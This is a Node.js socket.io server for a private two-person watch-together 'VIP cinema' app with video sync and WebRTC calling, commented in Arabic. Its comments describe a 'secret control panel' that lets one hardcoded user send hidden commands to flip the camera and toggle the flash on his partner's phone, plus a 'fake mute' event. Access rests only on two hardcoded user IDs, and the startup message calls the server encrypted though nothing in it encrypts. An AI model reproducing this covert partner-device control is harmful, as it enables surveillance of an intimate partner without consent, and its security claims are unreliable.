const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);

// إعداد أفضل لاتصالات ثابتة ومستقرة عبر الشبكات المختلفة لمنع التقطيع
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: true
    },
    pingInterval: 10000,
    pingTimeout: 25000
});

// تقديم الملفات الثابتة بأمان مع منع تخزين الكاش لصفحة الويب لضمان التحديثات الفورية
app.use(express.static(path.join(__dirname, './'), {
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-cache');
    }
}));

// المسار الرئيسي
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// إنشاء ملف التطبيق التلقائي مع روابط أيقونات تعمل دائماً بجودة عالية
app.get('/manifest.json', (req, res) => {
    res.json({
        "name": "سينما VIP 🎬",
        "short_name": "سينما VIP",
        "description": "مساحتنا الخاصة لمشاهدة معاً بكل خصوصية ومتعة",
        "start_url": "/",
        "display": "standalone",
        "background_color": "#05020a",
        "theme_color": "#ff2d55",
        "orientation": "portrait-primary",
        "icons": [
            {
                "src": "https://i.imgur.com/6KbXzQY.png",
                "sizes": "192x192",
                "type": "image/png",
                "purpose": "any maskable"
            },
            {
                "src": "https://i.imgur.com/8kYwRfL.png",
                "sizes": "512x512",
                "type": "image/png"
            }
        ]
    });
});

// حفظ حالة الفيديو بشكل دائم في ذاكرة الخادم لتتم المزامنة التلقائية عند دخول أي مستخدم جديد
let cinemaState = {
    videoUrl: "",
    isPlaying: false,
    lastSeekTime: 0,
    lastUpdated: Date.now(),
    playerType: "none"
};

// إدارة مستخدمي العائلة فقط بشكل آمن ومحمي
const activeUsers = {
    abouahad: null,
    umalara: null
};

io.on('connection', (socket) => {
    console.log('مستكشف متصل بالسينما:', socket.id);

    // تسجيل وتفويض المستخدمين
    socket.on('register-user', (userId) => {
        if (userId === 'abouahad' || userId === 'umalara') {
            activeUsers[userId] = socket.id;
            socket.userId = userId;

            const partnerId = userId === 'abouahad' ? 'umalara' : 'abouahad';
            const partnerSocketId = activeUsers[partnerId];

            // إبلاغ الطرفين بحالة الاتصال النشط فوراً لتحديث الألوان ونصوص الاتصال
            if (partnerSocketId) {
                io.to(partnerSocketId).emit('partner-status', { online: true });
                socket.emit('partner-status', { online: true });
            } else {
                socket.emit('partner-status', { online: false });
            }

            // إرسال آخر حالة سينما مسجلة فور الدخول لكي يبدأ تشغيل الفيلم تلقائياً من نفس الثانية
            socket.emit('cinema-state-update', cinemaState);
            console.log(`✅ تم تسجيل دخول العضو المعتمد: ${userId}`);
        } else {
            console.warn(`🚨 محاولة دخول غير مصرح بها من معرف: ${userId}`);
            socket.disconnect(true); // طرد تلقائي لأي متطفل
        }
    });

    // استقبال مزامنة التوقيت وحالة التشغيل وتوزيعها فوراً على الشريك الآخر
    socket.on('cinema-control', (data) => {
        cinemaState = {
            videoUrl: data.videoUrl || "",
            isPlaying: data.isPlaying || false,
            lastSeekTime: data.lastSeekTime || 0,
            lastUpdated: Date.now(),
            playerType: data.playerType || "none"
        };

        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) {
            io.to(partnerSocketId).emit('cinema-state-update', cinemaState);
        }
    });

    // تمرير إشارات WebRTC الصوتية والمرئية بدون أي تدخل لتأسيس اتصال الند للند
    socket.on('webrtc-offer', (data) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) io.to(partnerSocketId).emit('webrtc-offer', data);
    });

    socket.on('webrtc-answer', (data) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) io.to(partnerSocketId).emit('webrtc-answer', data);
    });

    socket.on('webrtc-candidate', (data) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        const partnerSocketId = activeUsers[partnerId];
        if (partnerSocketId) io.to(partnerSocketId).emit('webrtc-candidate', data);
    });

    // تفعيل لوحة تحكم أبو عاهد السرية الفخمة لإرسال أوامر تحكم خفية لهاتف شريكته
    socket.on('remote-flip-cam', () => {
        if (socket.userId === 'abouahad' && activeUsers.umalara) {
            io.to(activeUsers.umalara).emit('remote-flip-cam-triggered');
        }
    });

    socket.on('remote-flash-toggle', () => {
        if (socket.userId === 'abouahad' && activeUsers.umalara) {
            io.to(activeUsers.umalara).emit('remote-flash-triggered');
        }
    });

    // إرسال نبضات الحب والخصوصية المعتمة للشريكة
    socket.on('love-pulse', () => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        if (activeUsers[partnerId]) io.to(activeUsers[partnerId]).emit('love-pulse-received');
    });

    socket.on('privacy-fake-mute', (status) => {
        const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
        if (activeUsers[partnerId]) io.to(activeUsers[partnerId]).emit('privacy-fake-mute-received', status);
    });

    // إدارة الانفصال الآمن عند غلق المتصفح أو انقطاع الإنترنت المفاجئ
    socket.on('disconnect', () => {
        if (socket.userId) {
            activeUsers[socket.userId] = null;
            const partnerId = socket.userId === 'abouahad' ? 'umalara' : 'abouahad';
            if (activeUsers[partnerId]) {
                io.to(activeUsers[partnerId]).emit('partner-status', { online: false });
            }
            console.log('مستخدم غادر السينما:', socket.userId);
        }
    });
});

// تشغيل خادم السينما الفخمة
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n======================================================`);
    console.log(`✅ خادم سينما VIP المشفر يعمل بنجاح على المنفذ: ${PORT}`);
    console.log(`🚀 تصفح وانسخ رابط الغرفة المشترك عبر: http://localhost:${PORT}`);
    console.log(`======================================================\n`);
});
